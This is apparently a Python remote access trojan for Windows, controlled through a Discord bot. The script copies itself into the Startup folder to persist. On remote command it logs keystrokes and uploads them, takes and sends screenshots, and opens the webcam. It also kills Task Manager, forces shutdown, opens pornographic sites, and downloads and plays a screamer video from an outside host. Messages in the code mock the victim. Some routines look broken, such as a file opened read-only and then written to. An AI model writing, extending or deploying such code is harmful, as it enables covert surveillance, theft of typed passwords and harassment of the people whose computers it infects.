from pynput.keyboard import Listener, Key
import time
from time import sleep
import pyautogui
import mimetypes
import os 
from os.path import basename
import discord
from discord.ext import commands
import keyboard
import numpy as np
import pyautogui
import webbrowser
import random
import tkinter as tk
import sys
import requests
import wget
import cv2


Thisfile = sys.argv[0]
Thisfile_name = os.path.basename(Thisfile)
user_path = os.path.expanduser('~')

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
    os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')



while True:
    
     client = commands.Bot(command_prefix='.')
     @client.event
     async def on_ready():
      print('Hellow hacker)')
     @client.command(pass_context = True)
     async def hellow (ctx):
       await ctx.send('hellow')
     @client.command(pass_context = True)
     async def HELPME(ctx):
      await ctx.send(".keyloger \n .txt \n .link \n .screen \n .w \n .left \n .alt \n .net \n .sleep \n .knock \n .screamer \n .boom \n .snake")    

#               KEYLOGGER
# -------------------------------------------------------------------------------------------------

     def keylog():

         def key_pressed(key):
             with open('keys2.txt', 'at') as f:
                 k = str(key).replace("'", '')
                 if key==Key.space:
                     k = '\n'
                 if k.find('Key')==-1:

                     f.write(k)
         def key_release(key):
              seconds_left = 10
              while seconds_left > 0:
                 seconds_left -=1
                 if seconds_left == 0:
                     return False 
         with Listener(

              on_press= key_pressed,
             on_release=key_release,

         )as listenner:
                   listenner.join()
     
     @client.command(pass_context =True)
     async def keyloger (ctx):
      await ctx.command(keylog())
    
     @client.command(pass_context =True)
     async def txt  (ctx):
       await ctx.send(file=discord.File('keys2.txt'))
# -------------------------------------------------------------------------------------------------- 
    
#              SCRENSHOT
# --------------------------------------------------------------------------------------------------

     @client.command(pass_context =True) 
     async def screen  (ctx):
       pyautogui.screenshot('screen2.png')
       channel = client.get_channel('933647695862718537')
       await ctx.send('Улыбочку')
       await ctx.send(file=discord.File('screen2.png'))

# -----------------------------------------------------------------------------------------------------    

#                ALT+F4
# ----------------------------------------------------------------------------------------------------- 
    
     def altF():
      keyboard.send("alt+F4")
     @client.command(pass_context =True)
     async def alt (ctx):
       await ctx.send('изи')
       await ctx.command(altF())

# -----------------------------------------------------------------------------------------------------

#               OPEN LINKS
# -----------------------------------------------------------------------------------------------------

     def links():
      link = ['https://school.mos.ru/', 'https://mail.ru/','https://bugaga.ru/uploads/posts/1176585908_gee_ru_158598.jpg']
      _range_ = 10
      for i in range(_range_):
         webbrowser.open_new_tab(random.choice(link))
         print('link is open')    
     @client.command(pass_context =True)
     async def link(ctx):
      await ctx.command(links())


# ------------------------------------------------------------------------------------------------------

#                +W+SHIFT
# ---------------------------------------------------------------------------------------------------------

     def plusw():
      stop_time = 10
      while stop_time > 0:
        stop_time -=1
        keyboard.send('Shift + w')
        if stop_time == 0:
            return False
     @client.command(pass_context =True)
     async def w (ctx):
       await ctx.command(plusw())

# ---------------------------------------------------------------------------------------------------------

#                MOUSE-LEFT
# ---------------------------------------------------------------------------------------------------------

     def left2():
      stop =20
      while stop > 0:
        stop-=1
        pyautogui.moveRel( -100, 0, duration=0.25)
        if stop == 0:
          return False
     @client.command(pass_context =True)            
     async def left (ctx):
       await ctx.command(left2())

# --------------------------------------------------------------------------------------------------------

#                   XXXX
# --------------------------------------------------------------------------------------------------------

     def porno():
       links = ['https://www.xvideos.com/lang/russian','https://www.xnxx.com/','https://yandex.ru/video/preview/?text=%D0%BF%D0%BE%D1%80%D0%BD0&path=wizard&parent-reqid=1646399981395807-14594742809628869014-vla1-4654-vla-l7-balancer-8080-BAL-5661&wiz_type=vital&filmId=9993006095092683279']
       stop = 10
       for i in range(stop):
         webbrowser.open_new_tab(random.choice(  links))
        
     @client.command(pass_context =True)
     async def porn (ctx):
       await ctx.send('nice')
       await ctx.command(porno())

# ----------------------------------------------------------------------------------------------------------

#                  ZAPRET
#  ---------------------------------------------------------------------------------------------------------    
     def zapreti():
         stop = 30
         while stop > 0:
             time.sleep(2)
             os.system("TASKKILL /F /IM Taskmgr.exe")
             if stop == 0:
                 return False
     @client.command(pass_context =True)
     async def net(ctx):
         await ctx.send('Нельзя')
         await ctx.command(zapreti())            

#                  SUTDOWN
# -------------------------------------------------------------------------------------------------------------
     def shutdown():
         os.system("shutdown /s /t 1")
     @client.command(pass_context =True)
     async def sleep(ctx):
         await ctx.send('ПОКА')
         await ctx.command(shutdown())

# -------------------------------------------------------------------------------------------------------------         

#                    DOOR
# -------------------------------------------------------------------------------------------------------------
     def door():
         user_payh = os.path.expanduser('~')
         url = 'https://zvukipro.com/index.php?do=download&id=38387'
         r = requests.get(url)
         with open(f'{user_payh}\\Downloads\\cat3.mp3', 'rb') as f:
            f.write(r.content)
         os.startfile(f'{user_payh}\\Downloads\\cat3.mp3')
         return False 
     @client.command(pass_context =True)
     async def knock(ctx):
         await ctx.send('ТУК ТУК')
         await ctx.command(door())

# --------------------------------------------------------------------------------------------------------------

#                    SCREAMER
# --------------------------------------------------------------------------------------------------------------
     def scream():
       wget.download('http://f0512202.xsph.ru/videoplayback.mp4')
       os.system('videoplayback.mp4')
     @client.command(pass_context =True)
     async def screamer(ctx):
       await ctx.send('Жертва обасралась')
       await ctx.command(scream())
       

# --------------------------------------------------------------------------------------------------------------

#                    SNAKE
# --------------------------------------------------------------------------------------------------------------
     def snk():
       stop =20
       while stop > 0:
        stop-=1
        pyautogui.moveRel( -100, 0, duration=0.25)
        pyautogui.moveRel( 0, -100, duration=0.25)
        pyautogui.moveRel( 100, 0, duration=0.25) 
        pyautogui.moveRel( 0,-100, duration=0.25)
        pyautogui.moveRel( -100, 0, duration=0.25)
        if stop == 0:
          return False
     @client.command(pass_context =True)
     async def snake(ctx):
       await ctx.command(snk())

# ---------------------------------------------------------------------------------------------------------------

#                   ANARCHIA
# ---------------------------------------------------------------------------------------------------------------

     def ana():
       stop = 10
       while stop > 0:
         stop -= 1   
         file_path = r'C:\windows\system32\cmd.exe'
         os.system("start "+file_path)
         keyboard.send('Win + e')
     @client.command(pass_context =True)
     async def boom(ctx):
       await ctx.send('KABOOOM')
       await ctx.command(ana())  
       


# -----------------------------------------------------------------------------------------------------------------

#               VEBcam
# -----------------------------------------------------------------------------------------------------------------
     def cam():
       stop2 = 20
       cap = cv2.VideoCapture(0)
       while stop2 > 0:
         stop2 -= 1
         ret, frame = cap.read() # Display the frame cv2.imshow('Camera',frame)
         if cv2.waitKey(1) & 0xFF == ord('q'): break
       cap.release()
     @client.command(pass_context =True) 
     async def cam(ctx):
       await ctx.send('Запись началась...')
       await ctx.command(cam())







     token =('YOUR TOKEN BOT') 
     
     client.run(token)
     

     seconds_left = 5
